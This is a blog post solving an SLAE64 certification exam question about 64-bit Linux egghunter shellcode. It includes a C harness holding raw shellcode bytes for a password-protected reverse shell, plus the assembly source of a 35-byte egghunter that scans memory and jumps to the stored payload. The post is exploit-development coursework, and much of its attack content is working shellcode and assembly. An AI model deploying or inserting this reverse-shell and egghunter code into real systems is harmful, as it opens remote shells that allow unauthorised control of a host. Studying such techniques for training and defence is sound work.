title: Egghunter Shellcode
date: 2018-05-19
published: true 
summary: My solution to SLAE64 Exam Question 3
tags: shellcode, exploit, assembly

#Egghunter Shellcode

This is my solution to the third exam question of the SLAE64 certification. This exercise was to research "Egghunter" shellcode and create a demo of the payload.

Egghunter shellcode essentially is a small stub shellcode program which searches for a particular flag or series of bytes in memory, and then jumps to that location. In general, this would be used in situations where you only have the ability to execute a limited amount of instructions. Maybe your full payload doesn't fit in that space. The solution is to store the real payload somewhere else in memory, and just use the egghunter shellcode to search for that payload and jump to it. "Hunting for the egg" is necessary, since in some situations the payload may be stored in unknown memory locations.

Depending on the situation, it's possible for the "egg" to be on the stack, heap, or somewhere else in process memory (uninitialized/initialized data). You won't know the exact location, hence the need for egghunting code.

In previous posts, I really just tried to remove null bytes and didn't optimize much for size. However - the entire reason egghunter code exists is to deal with size restrictions, so I wanted to optimize my final payload as much as possible.

As an example, I set up a C program which allocates memory on the heap for the 8 byte flag and the rest of the reverse-shell shellcode from exam questions 2. I kept the password protection - the assumption is you are only worried about size constraints for the egghunter stub. That's basically the entire point - so you can store a bigger payload somewhere else, find it, and execute it. There's no way to guess the address of this buffer prior to runtime, so our egghunter code will have to find this buffer and jump to it.

This is the example C program used:

        #include <stdio.h>
        #include <string.h>
        #include <stdlib.h>

        //egg precedes payload when we put on heap with malloc
        //8 bytes
        char egg[] = "mrtfegg\x23";

        //This is egghunter shellcode
        unsigned char code[] = "\x48\x31\xf6\x6a\x15\x58\x52\x5f\x48\x83\xc2\x08\x0f\x05\x3c\xf2\x74\xf1\x48\xb8\x6d\x72\x74\x66\x65\x67\x67\x23\x48\x3b\x07\x75\xe2\xff\xe2";

        //rev shell payload - :
        unsigned char payload[] = "\x48\x31\xc0\xb0\x29\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x52\x52\xc7\x44\x24\x04\x5c\x23\x23\x22\x81\x74\x24\x04\x23\x23\x23\x23\x66\xc7\x44\x24\x02\x7a\x69\xc6\x04\x24\x02\x48\x31\xc0\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x40\xb6\x01\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x48\x31\xd2\xb2\x08\x0f\x05\x48\xbb\x6d\x72\x74\x66\x73\x68\x31\x0a\x48\x8b\x3c\x24\x48\x39\xfb\x75\x20\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x90";

        main()
        {
                //strlen ok here bc no nulls in either
                printf("mallocing memory for execve payload:\t%d byte egg\t%d byte payload\n\n", (int)strlen(egg), (int)strlen(payload));
                //malloc space for egg + reverse shell (157+8)
                char *sc_loc;
                size_t payload_len = strlen(egg) + strlen(payload);
                sc_loc = malloc(payload_len);
                //memcpy egg, then payload so it is all in some unknown loc in memory
                memcpy(sc_loc, egg, (int)strlen(egg));
                memcpy(sc_loc+8,payload,(int)strlen(payload));
                printf("egg and payload copied to start address %p\n\n",sc_loc);
                int (*ret)() = (int(*)())code;
                ret();
        }

As in most of these examples, I compiled this program with the following `gcc` command (notice I don't mark the `malloc`'d memory executable, `-execstack` also makes the heap executable I learned...)

The trickiest part of this, in my opinion, is figuring out how to safely scan process memory. The process address space is going to be full of memory that you can't actually access - attempting to do so will crash the program. The paper [here](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) basically walks through how to avoid bad memory accesses by checking the return values of specific syscalls. It provides three different implementations for Linux. At first I wanted to try the `sigaction` method, but after a bit of research I saw that syscall had changed quite a bit in the move to 64 bit architecture, so I stuck with the `access` method. Implementation proved trickier than I thought for sure, this question probably took me longer to get working than any other on the exam...

Here is my solution. It's only 35 bytes, which is significantly less than the 157 byte reverse shell payload I stored with the egg, so it could at least potentially work as an exploitation strategy in an extremely limited situation. 

        BITS 64

        global _start

        ;egg=mrtfegg\x23
        EGG equ 0x236767656674726d

        section .text
        _start:
                ;Egghunter shellcode
                ;adapted from 32 bit access implementation here: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
                xor rsi,rsi
        loop:
                ;access syscall is 21
                push 0x15
                pop rax
                push rdx
                pop rdi
                add rdx,0x8
                ; make access system call
                syscall
                ; EFAULT is bad page
                cmp al,0xf2
                ;EFAULT, next address
                jz loop
                mov rax, EGG
                cmp rax, [rdi]
                jnz loop
                jmp rdx

The general strategy behind the code is to iterate through memory addresses and use the `access` syscall to check if memory is valid. If the error code returned is `EFAULT`, then its a bad page , and we must skip it to avoid a program crash on a read attempt. If it's not, we compare the 8 bytes in memory with our egg. If they match, jump just past it to the code stored there. There are a couple differences in my code than the original paper. For one, the paper includes a routine to skip to the next page if the `access` syscall returns `EFAULT`. This makes the memory space search much faster. However, I wanted to optimize for code size rather than search time, so I removed that routine.

The search code was horribly slow with or without the logic to skip to the next page on a page fault. Turns out, you can't really efficiently exhaustively search 64-bit address space :). Rather than waiting hours while my shellcode was found, I cheated a little and examined the program state in gdb. I noticed that since the instruction that called the shellcode was `call rdx`, `rdx` already held the address of the start of the shellcode.  

![gdb rdx](/static/blog/2018/SLAE64/3/gdb_rdx.png)

This starting point was a pretty decent one, as the shellcode was still relatively small, it was copied into a low virtual address - generally between 0x1000000 and 0x2000000 on my machine during a few tests. Anyway, when run, finding the egg took anywhere between 10 and 20 seconds on my VM, but that was acceptable to me:

![egghunter fin](/static/blog/2018/SLAE64/3/egghunter_final.png)

All code referenced in this blog post is available at: <https://github.com/mrT-F/SLAE64/tree/master/3>

####Some research references used: 
* <http://www.fuzzysecurity.com/tutorials/expDev/4.html>
* <https://www.corelan.be/index.php/2010/01/09/>exploit-writing-tutorial-part-8-win32-egg-hunting/
* <http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf>

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification* 

*Certification at: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>*

*Student ID: SLAE64 - 1546*